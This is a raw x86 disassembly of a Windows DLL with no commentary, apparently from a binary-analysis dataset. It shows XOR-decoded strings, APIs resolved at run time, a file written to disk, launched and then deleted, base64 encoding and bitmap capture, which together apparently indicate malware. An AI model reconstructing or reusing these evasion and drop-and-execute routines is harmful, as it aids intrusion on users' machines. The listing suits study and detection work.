call [ CryptBinaryToStringA@IAT ]
push [ ebp - 0x4 ]
call sub_10003f3c
pop ecx
mov esi eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push ebx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CryptBinaryToStringA@IAT ]
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10002f69
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
call [ lstrlenA@IAT ]
xor ecx ecx
push 0x2
pop edx
lea esi [ eax + 0x1 ]
mov eax esi
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003f3c
pop ecx
push esi
mov edi eax
push edi
push 0xffffffff
push [ ebp + 0x8 ]
push 0x0
push 0x0
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
push edi
call j_sub_10003f1b
pop ecx
xor edi edi
sub_10002fb7
push ebp
mov ebp esp
push esi
push edi
xor eax eax
push eax
push eax
push eax
push eax
push 0xffffffff
push [ ebp + 0x8 ]
push eax
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov esi eax
push esi
call sub_10003f3c
pop ecx
mov edi eax
xor eax eax
push eax
push eax
push esi
push edi
push 0xffffffff
push [ ebp + 0x8 ]
push eax
push 0xfde9
call [ WideCharToMultiByte@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
retn
sub_10002ffb
push ebp
mov ebp esp
sub esp 0x14
push ebx
push edi
lea eax [ ebp - 0x8 ]
xor edi edi
and [ ebp - 0x8 ] edi
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10002ede
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x4 ]
push esi
push 0x4
push ebx
push eax
call sub_10003271
mov esi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
add esi 0xfffffffc
xor eax 0xaa7d756
push esi
mov [ ebp - 0x14 ] eax
call sub_10003f3c
add esp 0x10
mov edx eax
xor ecx ecx
mov [ ebp - 0x10 ] edx
test esi esi
je r-xdata
and [ ebp - 0xc ] edi
lea eax [ ebp - 0xc ]
push 0x2
push edx
push eax
call sub_10003271
mov eax [ ebp + 0x10 ]
add esi 0xfffffffe
mov [ eax ] esi
lea eax [ esi + 0x1 ]
push eax
call sub_10003f3c
mov ecx [ ebp - 0x10 ]
mov edi eax
push esi
add ecx 0x2
push ecx
push edi
call sub_10003271
push esi
push edi
push [ ebp - 0xc ]
call sub_100031fe
add esp 0x28
pop esi
test al al
jne r-xdata
mov eax ecx
and eax 0x3
mov al [ ebp + eax - 0x14 ]
xor al [ ebx + ecx + 0x4 ]
mov [ ecx + edx ] al
inc ecx
cmp ecx esi
jb r-xdata
push [ ebp - 0x10 ]
call j_sub_10003f1b
push ebx
call j_sub_10003f1b
pop ecx
pop ecx
push edi
call j_sub_10003f1b
pop ecx
xor edi edi
sub_100030d1
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
lea eax [ ebx + 0x1 ]
push eax
call sub_10003f3c
mov esi eax
xor eax eax
mov [ ebp + 0xc ] eax
pop ecx
test ebx ebx
jle r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
sub edi esi
lea ecx [ eax + esi ]
mov [ ebp - 0x4 ] 0xe
xor edx edx
div [ ebp - 0x4 ]
mov al [ edx + r--data ]
xor al [ edi + ecx ]
mov [ ecx ] al
mov eax [ ebp + 0xc ]
inc eax
mov [ ebp + 0xc ] eax
cmp eax ebx
jl r-xdata
pop edi
sub_10003123
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xffffffff
push 0x1010101
call sub_10003de0
mov ebx [ ebp + 0xc ]
pop ecx
mov [ ebp - 0x8 ] eax
xor eax 0xaa7d756
cmp [ ebp + 0x10 ] 0x0
pop ecx
mov [ ebp - 0x4 ] eax
push ebx
je r-xdata
call sub_10003f3c
push ebx
push [ ebp + 0x8 ]
mov edi eax
mov [ ebp + 0x10 ] eax
push edi
call sub_10003271
add esp 0x10
push [ ebp + 0x8 ]
call sub_10003217
movzx eax ax
lea esi [ ebx + 0x2 ]
push esi
mov [ ebp + 0xc ] eax
call sub_10003f3c
mov edi eax
lea eax [ ebp + 0xc ]
push 0x2
push eax
push edi
mov [ ebp + 0x10 ] edi
call sub_10003271
push ebx
push [ ebp + 0x8 ]
lea ecx [ edi + 0x2 ]
push ecx
call sub_10003271
add esp 0x24
mov ebx esi
jmp r-xdata
lea esi [ ebx + 0x4 ]
push esi
call sub_10003f3c
mov edi eax
lea eax [ ebp - 0x8 ]
push 0x4
push eax
push edi
call sub_10003271
push ebx
mov ebx [ ebp + 0x10 ]
lea ecx [ edi + 0x4 ]
push ebx
push ecx
call sub_10003271
push esi
push edi
call sub_10002f22
push edi
mov esi eax
call j_sub_10003f1b
push ebx
call j_sub_10003f1b
add esp 0x2c
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ecx
and eax 0x3
mov al [ ebp + eax - 0x4 ]
xor [ ecx + edi ] al
inc ecx
cmp ecx ebx
jb r-xdata
xor ecx ecx
test ebx ebx
je r-xdata
sub_10003217
push ebp
mov ebp esp
push ecx
xor edx edx
mov cx dx
mov [ ebp - 0x4 ] edx
cmp [ ebp + 0xc ] edx
jbe r-xdata
mov ax cx
mov esp ebp
pop ebp
retn
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
shr cx 0x1
mov [ ebp - 0x4 ] cx
mov eax 0x2042
xor ax cx
shr ax 0x1
movzx eax ax
mov [ ebp - 0x4 ] eax
mov cx ax
jmp r-xdata
mov al bl
xor al [ ebp - 0x4 ]
test al 0x1
je r-xdata
inc edx
cmp edx [ ebp + 0xc ]
jb r-xdata
shr bl 0x1
sub esi 0x1
jne r-xdata
mov bl [ edx + edi ]
push 0x8
pop esi
pop edi
pop esi
pop ebx
sub_10003271
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0x10 ]
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov edx [ ebp + 0xc ]
push edi
mov edi eax
sub edi edx
mov cl [ edx ]
mov [ edi + edx ] cl
inc edx
sub esi 0x1
jne r-xdata
pop edi
sub_10003296
push ebp
mov ebp esp
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
mov eax [ ebp + 0x8 ]
pop ebp
retn
movzx eax [ ebp + 0xc ]
push esi
mov esi ecx
imul eax eax 0x1010101
push edi
mov edi [ ebp + 0x8 ]
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
[ edi ]
pop edi
pop esi
sub_100032c4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
jmp r-xdata
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl dl
je r-xdata
pop ebp
retn
inc eax
xor eax eax
sub_100032e2
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
cmp [ ebx ] 0x0
jne r-xdata
mov al [ edx ]
push esi
push edi
test al al
je r-xdata
mov eax edx
jmp r-xdata
xor eax eax
mov edi edx
sub edi ebx
pop ebx
pop ebp
retn
cmp [ esi ] 0x0
je r-xdata
mov al [ esi ]
test al al
je r-xdata
mov eax edx
jmp r-xdata
inc edx
inc edi
mov al [ edx ]
test al al
jne r-xdata
movsx ecx [ edi + esi ]
movsx eax al
sub ecx eax
jne r-xdata
pop edi
pop esi
mov esi ebx
test al al
je r-xdata
inc esi
cmp [ edi + esi ] cl
jne r-xdata
sub_10003336
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dx [ ebp + 0xc ]
jmp r-xdata
movzx ecx [ eax ]
test cx cx
jne r-xdata
cmp cx dx
je r-xdata
cmp [ eax ] dx
je r-xdata
pop ebp
retn
add eax 0x2
xor eax eax
sub_1000335b
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
movzx edi [ edx ]
movzx ecx [ esi ]
sub ecx edi
jne r-xdata
pop edi
pop esi
test ecx ecx
jns r-xdata
sub esi edx
xor eax eax
test ecx ecx
setg al
pop ebp
retn
or eax 0xffffffff
pop ebp
retn
add edx 0x2
movzx edi [ edx ]
movzx ecx [ esi + edx ]
sub ecx edi
je r-xdata
test di di
je r-xdata
sub_10003399
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xa
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xe
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_10003406
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xc
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xe
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0x2c ]
push [ ebp + 0x28 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_10003491
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0x9
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x15
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_10003507
push ebp
mov ebp esp
push ebx
push esi
push edi
push 0xc
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x19
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov ebx eax
sub_1000356e
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xa
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x10
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_100035de
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xb
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xc
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_10003654
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xb
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xd
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_100036c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xb
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xc
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_10003737
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xa
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x15
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_100037ad
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push 0xa
push r--data
xor ebx ebx
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0xd
push r--data
call sub_100030d1
pop ecx
pop ecx
push eax
push esi
mov [ ebp - 0x4 ] eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
push [ ebp + 0x8 ]
call eax
mov ebx eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_1000381d
push ebp
mov ebp esp
push esi
push edi
push 0xa
push r--data
call sub_100030d1
pop ecx
pop ecx
mov edi eax
push edi
call [ GetModuleHandleA@IAT ]
mov esi eax
test esi esi
jne r-xdata
push ebx
push 0xb
push r--data
call sub_100030d1
pop ecx
pop ecx
mov ebx eax
push ebx
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push edi
call [ LoadLibraryA@IAT ]
mov esi eax
test esi esi
je r-xdata
push ebx
call j_sub_10003f1b
pop ecx
pop ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
push edi
call j_sub_10003f1b
pop ecx
pop edi
pop esi
pop ebp
retn
sub_1000389d
push esi
mov esi ecx
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push [ esi + 0xc ]
call j_sub_10003f1b
pop ecx
cmp [ esi + 0x4 ] 0x0
je r-xdata
push [ esi + 0x8 ]
call j_sub_10003f1b
pop ecx
pop esi
retn
push [ esi + 0x4 ]
call j_sub_10003f1b
pop ecx
sub_100038cf
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x0
je r-xdata
lea eax [ edi + 0x10 ]
push eax
call [ DeleteFileW@IAT ]
push edi
call j_sub_10003f1b
pop ecx
xor eax eax
pop edi
pop ebp
retn 0x4
push 0xffffffff
push [ edi ]
call [ WaitForSingleObject@IAT ]
push [ edi ]
call [ CloseHandle@IAT ]
push [ edi + 0x4 ]
call [ CloseHandle@IAT ]
sub_1000390e
push ebp
mov ebp esp
sub esp 0x70
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
push 0x12
pop eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
push esi
push 0x0
call [ SetLastError@IAT ]
push 0x0
push [ edi + 0xc ]
call [ CreateDirectoryW@IAT ]
mov esi eax
call [ GetLastError@IAT ]
mov ebx eax
test esi esi
jne r-xdata
push 0x802
call sub_10003f3c
push 0x25
pop edx
push 0x73
pop ecx
mov ebx eax
mov [ ebp - 0x1c ] dx
push 0x5c
pop eax
push [ edi + 0x4 ]
mov [ ebp - 0x18 ] ax
xor eax eax
push [ edi + 0xc ]
mov [ ebp - 0x12 ] ax
lea eax [ ebp - 0x1c ]
push eax
push ebx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x1a ] cx
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x14 ] cx
call [ wsprintfW@IAT ]
mov esi [ SetLastError@IAT ]
add esp 0x14
mov [ ebp - 0x10 ] eax
push 0x0
call esi
xor eax eax
push eax
push 0x2
push 0x2
push eax
push eax
push 0x40000000
push ebx
call [ CreateFileW@IAT ]
mov [ ebp - 0x8 ] eax
call [ GetLastError@IAT ]
cmp [ ebp - 0x8 ] 0xffffffff
mov ebx eax
je r-xdata
cmp ebx 0xb7
jne r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
pop ecx
xor ebx ebx
push ebx
call esi
push ebx
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] ebx
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ ebp - 0x8 ]
call [ WriteFile@IAT ]
mov esi eax
call [ GetLastError@IAT ]
push [ ebp - 0x8 ]
mov ebx eax
call [ CloseHandle@IAT ]
test esi esi
je r-xdata
pop esi
mov eax ebx
pop ebx
jmp r-xdata
pop edi
mov esp ebp
pop ebp
retn 0x8
push 0x40
xor esi esi
lea eax [ ebp - 0x6c ]
push esi
push eax
call sub_10003296
add esp 0xc
mov [ ebp - 0x70 ] 0x44
cmp [ edi + 0x10 ] 0x0
xorps xmm0 xmm0
mov [ ebp - 0x44 ] 0x1
movups [ ebp - 0x2c ] xmm0
je r-xdata
cmp [ edi + 0x8 ] esi
je r-xdata
push esi
call [ SetLastError@IAT ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push esi
push esi
push esi
push esi
push esi
push esi
push esi
push [ ebp - 0x4 ]
call sub_10003406
add esp 0x28
test eax eax
je r-xdata
cmp [ edi + 0x12 ] 0x0
je r-xdata
push 0x802
call sub_10003f3c
push 0xc
push r--data
mov esi eax
call sub_100030d1
push eax
mov [ ebp + 0x8 ] eax
call sub_10002f69
push [ edi + 0x8 ]
mov [ ebp + 0xc ] eax
push [ ebp - 0x4 ]
push eax
push r--data
push esi
call [ wsprintfW@IAT ]
add esp 0x24
xor ebx ebx
push ebx
call [ SetLastError@IAT ]
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push esi
push ebx
call sub_10003406
add esp 0x28
test eax eax
jne r-xdata
call [ GetLastError@IAT ]
mov ebx eax
mov ebx esi
jmp r-xdata
cmp [ edi + 0x11 ] 0x0
je r-xdata
push esi
call [ SetLastError@IAT ]
push [ ebp - 0x4 ]
call [ LoadLibraryW@IAT ]
test eax eax
je r-xdata
push [ ebp + 0xc ]
call j_sub_10003f1b
push [ ebp + 0x8 ]
call j_sub_10003f1b
push esi
call j_sub_10003f1b
add esp 0xc
jmp r-xdata
call [ GetLastError@IAT ]
mov ebx eax
mov esi [ ebp - 0x10 ]
add esi esi
lea eax [ esi + 0x12 ]
push eax
call sub_10003f3c
mov edi eax
lea eax [ ebp - 0x2c ]
push 0x10
push eax
push edi
call sub_10003271
push esi
push [ ebp - 0x4 ]
lea ecx [ edi + 0x10 ]
push ecx
call sub_10003271
add esp 0x1c
xor eax eax
push eax
push eax
push edi
push sub_100038cf
push eax
push eax
call [ CreateThread@IAT ]
push eax
mov ebx esi
call [ FreeLibrary@IAT ]
jmp r-xdata
sub_10003b82
push ebp
mov ebp esp
sub esp 0x18
push esi
mov esi ecx
push edi
xor edi edi
cmp [ esi + 0x13 ] 0x0
jne r-xdata
push ebx
push 0x802
call sub_10003f3c
mov ebx eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x18 ] ebx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push 0x25
pop eax
push 0x73
mov [ ebp - 0x10 ] ax
pop eax
push [ esi + 0x4 ]
mov [ ebp - 0xe ] ax
xor eax eax
mov [ ebp - 0xc ] ax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call [ wsprintfW@IAT ]
add esp 0xc
cmp [ eax ] di
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
push ebx
call j_sub_10003f1b
pop ecx
mov eax edi
pop ebx
push edi
call [ SetLastError@IAT ]
push edi
push esi
call [ GetFileSize@IAT ]
mov ebx eax
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp ebx 0xffffffff
je r-xdata
push 0x25
pop ecx
push 0x73
pop edx
push 0x5c
mov [ ebp - 0x14 ] cx
pop ecx
push 0x25
mov [ ebp - 0x10 ] cx
pop ecx
push [ esi + 0x4 ]
mov [ ebp - 0xe ] cx
xor ecx ecx
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0x12 ] dx
push eax
push ebx
mov [ ebp - 0xc ] dx
mov [ ebp - 0xa ] cx
call [ wsprintfW@IAT ]
add esp 0x10
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov ebx [ ebp - 0x18 ]
push ebx
call sub_10003f3c
pop ecx
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edi
call [ SetLastError@IAT ]
push edi
lea eax [ ebp - 0x8 ]
push eax
push ebx
push [ ebp - 0x4 ]
push esi
call [ ReadFile@IAT ]
mov esi eax
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
test esi esi
je r-xdata
push edi
call [ SetLastError@IAT ]
push edi
push 0x80
push 0x3
push edi
push edi
push 0x80000000
push ebx
call [ CreateFileW@IAT ]
mov esi eax
mov [ ebp - 0xc ] esi
call [ GetLastError@IAT ]
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
cmp esi 0xffffffff
je r-xdata
push [ ebp - 0x4 ]
call j_sub_10003f1b
mov esi [ ebp - 0xc ]
pop ecx
cmp [ ebp - 0x8 ] ebx
jne r-xdata
push ebx
push [ ebp - 0x4 ]
mov [ ecx ] edi
call sub_10002f22
pop ecx
pop ecx
mov edi eax
sub_10003ce4
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x4
push eax
mov [ esi ] eax
call sub_10002f69
pop ecx
mov [ esi + 0x4 ] eax
sub_10003d1e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push ebx
mov ebx ecx
je r-xdata
pop ebx
pop ebp
retn 0x4
push edi
push [ ebp + 0x8 ]
call sub_10002f69
mov edi eax
pop ecx
test edi edi
je r-xdata
pop edi
push esi
push 0x0
push 0x0
push edi
call sub_10003507
xor ecx ecx
mov esi eax
push 0x2
pop edx
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_10003f3c
push esi
push eax
push edi
mov [ ebx + 0xc ] eax
call sub_10003507
push edi
call j_sub_10003f1b
add esp 0x20
pop esi
sub_10003d95
push esi
push 0x3e
mov esi ecx
call sub_10003f3c
pop ecx
mov [ esi ] eax
mov dl 0x30
lea eax [ edx - 0x30 ]
movsx ecx al
mov eax [ esi ]
mov [ ecx + eax ] dl
inc dl
cmp dl 0x3a
jl r-xdata
mov dl 0x41
lea eax [ edx - 0x37 ]
movsx ecx al
mov eax [ esi ]
mov [ ecx + eax ] dl
inc dl
cmp dl 0x5b
jl r-xdata
mov dl 0x61
lea eax [ edx - 0x3d ]
movsx ecx al
mov eax [ esi ]
mov [ ecx + eax ] dl
inc dl
cmp dl 0x7b
jl r-xdata
pop esi
retn
sub_10003dfa
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
push 0x1
call sub_10003de0
mov esi [ ebp + 0x8 ]
mov edi eax
lea edx [ esi + 0x1 ]
imul edx edi
inc edx
push edx
call sub_10003f3c
and [ ebp + 0xc ] 0x0
add esp 0xc
mov ebx eax
test edi edi
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push esi
push 0x1
call sub_10003de0
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
push eax
call sub_10003e73
mov ecx [ ebp + 0xc ]
mov esi eax
push esi
add ecx ebx
push r--data
push ecx
call [ wsprintfA@IAT ]
add [ ebp + 0xc ] eax
push esi
call j_sub_10003f1b
mov esi [ ebp + 0x8 ]
add esp 0x10
sub edi 0x1
jne r-xdata
sub_10003e73
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
mov [ ebp - 0x4 ] ecx
lea eax [ ebx + 0x1 ]
push eax
call sub_10003f3c
xor esi esi
mov edi eax
pop ecx
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x3d
push 0x0
call sub_10003de0
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov ecx [ ecx ]
mov al [ eax + ecx ]
mov [ esi + edi ] al
inc esi
cmp esi ebx
jb r-xdata
sub_10003eb8
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ Sleep@IAT ]
push esi
push edi
push 0x0
call ebx
lea eax [ ebp - 0x8 ]
push eax
call [ QueryPerformanceCounter@IAT ]
push 0x0
call ebx
lea eax [ ebp - 0x10 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov edi [ ebp - 0x8 ]
mov esi [ ebp - 0x10 ]
xor edi [ ebp - 0x4 ]
xor esi [ ebp - 0xc ]
push 0x0
call ebx
call [ GetTickCount@IAT ]
xor eax esi
xor eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10003f1b
push ebp
mov ebp esp
call [ GetProcessHeap@IAT ]
test eax eax
je r-xdata
pop ebp
retn
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push [ ebp + 0x8 ]
push 0x0
push eax
call [ HeapFree@IAT ]
sub_10003f4a
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push esi
push eax
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
mov [ esi ] r--data
call GdipCreateBitmapFromHBITMAP
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x8
sub_10003f7c
push ebp
mov ebp esp
push esi
mov esi ecx
push [ esi + 0x4 ]
mov [ esi ] r--data
call GdipDisposeImage
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
test [ ebp + 0x8 ] 0x4
jne r-xdata
push 0x10
push esi
call sub_100022e6
pop ecx
pop ecx
push esi
call GdipFree
jmp r-xdata
sub_10003fb5
push ebp
mov ebp esp
push ecx
